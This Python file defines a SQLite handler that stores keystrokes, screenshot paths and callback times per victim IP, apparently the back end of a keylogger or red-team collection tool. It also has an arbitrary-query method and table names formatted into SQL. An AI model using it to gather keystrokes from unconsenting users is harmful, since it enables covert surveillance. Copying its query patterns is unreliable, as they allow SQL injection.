"""
Database handler object
Author: Micah Martin (knif3)
"""
from os.path import exists
import sqlite3
from database.utilities import validate_ip as vip


# Also disabling warning about catch-all excepts
# pylint: disable=W0702
class Database(object):
    """
    Database handler object. Abstracts alot of SQLite stuff
    """
    def __init__(self, location, script=None):
        # The location of the DB
        self.location = location
        # Check if the file exists BEFORE the connect creates it
        ex = exists(location)
        self.conn = sqlite3.connect(location, check_same_thread=False)
        self.cur = self.conn.cursor()
        # If it doesnt exist, run the script on it
        if not ex:
            print("Creating DB")
            self.create(script)

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.close()

    def close(self):
        """
        Close the connection
        """
        self.conn.close()

    def create(self, script=None):
        """
        Create the database with the given script
        """
        self.location = "db_servers.sqlite"
        # set the location of the script
        if script is None:
            script = "build_db.sql"

        # Read the build script
        fil = open(script)
        build_script = fil.read()
        fil.close()
        # Build the tables
        self.cur.executescript(build_script)
        # Commit the new script
        self.conn.commit()

    def qry(self, qry):
        """
        Execute an arbitrary query
        """
        self.cur.execute(qry)
        return self.cur.fetchall()

    @staticmethod
    def newcur(cursor):
        """
        Format the cursor output as json
        """
        output = []
        try:
            # Get all of the columns in the output
            cols = [c[0] for c in cursor.description]
            # Get all the data
            for i in cursor.fetchall():
                _d = {}
                # Shove it into the json
                # pep8 is really dumb sometimes
                # pylint: disable=C0200
                for j in range(len(cols)):
                    _d[cols[j]] = i[j]
                output += [_d]
            # return the output
            return output
        except:
            # Just fail because there is probably not a result
            return {}

    def add_data(self, addr, key, value):
        """
        Add a random data entry to the DB
        """
        # Make sure we are using a valid IP address
        addr = addr.strip()
        if not vip(addr):
            raise Exception("Not a valid IP")
        # Create a query string that will update the last check in time for an ip
        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
        # Create a string that will add the keystroke to the DB
        qry2 = "INSERT INTO data('ip','name', 'data') VALUES(?,?,?);"
        # Update the last callback time
        self.cur.execute(qry1, (addr,))
        # Add the keystroke to the database
        self.cur.execute(qry2, (addr, key, value))
        # Write the changes to the DB
        self.conn.commit()

    def add_keystroke(self, addr, keystroke):
        """
        Add a keystroke entry to the DB
        """
        # Make sure we are using a valid IP address
        addr = addr.strip()
        if not vip(addr):
            raise Exception("Not a valid IP")
        # Create a query string that will update the last check in time for an ip
        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
        # Create a string that will add the keystroke to the DB
        qry2 = "INSERT INTO keystrokes('ip','keystroke') VALUES(?,?);"
        # Update the last callback time
        self.cur.execute(qry1, (addr,))
        # Add the keystroke to the database
        self.cur.execute(qry2, (addr, keystroke.decode('utf-8')))
        # Write the changes to the DB
        self.conn.commit()

    def add_file(self, addr, filename):
        """
        Add a file entry to the DB
        """
        # Make sure we are using a valid IP address
        addr = addr.strip()
        if not vip(addr):
            raise Exception("Not a valid IP")
        # Create a query string that will update the last check in time for an ip
        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
        # Create a string that will add the filename to the DB
        qry2 = "INSERT INTO files('ip','filename') VALUES(?,?);"
        # Update the last callback time
        self.cur.execute(qry1, (addr,))
        # Add the filename to the database
        self.cur.execute(qry2, (addr, "/" + filename))
        # Write the changes to the DB
        self.conn.commit()

    def get_keystrokes(self, addr):
        """
        Get screenshots from a specific host
        :param addr: host to retrieve from
        :return: tables of keystroke lines
        """
        addr = addr.strip()

        # construct and execute query
        qry = "SELECT * FROM {} WHERE {} = ?;".format("keystrokes", "ip")
        self.cur.execute(qry, (addr,))
        results = self.cur.fetchall()

        # return results if query succeeds
        if not results:
            return {}
        return results

    def get_files(self, addr):
        """
        Get screenshots from a specific host
        :param addr: host to retrieve from
        :return: tables of paths to screenshots
        """
        addr = addr.strip()

        # construct and execute query
        qry = "SELECT * FROM {} WHERE {} = ?;".format("files", "ip")
        self.cur.execute(qry, (addr,))
        results = self.cur.fetchall()

        # return results if query succeeds
        if not results:
            return {}
        return results

    def get_unique_hosts(self):
        """Get a list of unique hosts in the database"""
        # construct and execute query
        qry = "SELECT DISTINCT {} FROM {};".format("ip", "timestamps")
        self.cur.execute(qry)
        results = self.cur.fetchall()

        # return results if query succeeds
        if not results:
            return {}
        return results

    def generic(self, table, col, val):
        """
        Use this function as a template for new query commands
        """
        # construct and execute query
        qry = "SELECT * FROM {} WHERE {} = ?;".format(table, col)
        self.cur.execute(qry, (val,))
        results = self.cur.fetchall()

        # return results if query succeeds
        if not results:
            return {}
        return results[0]
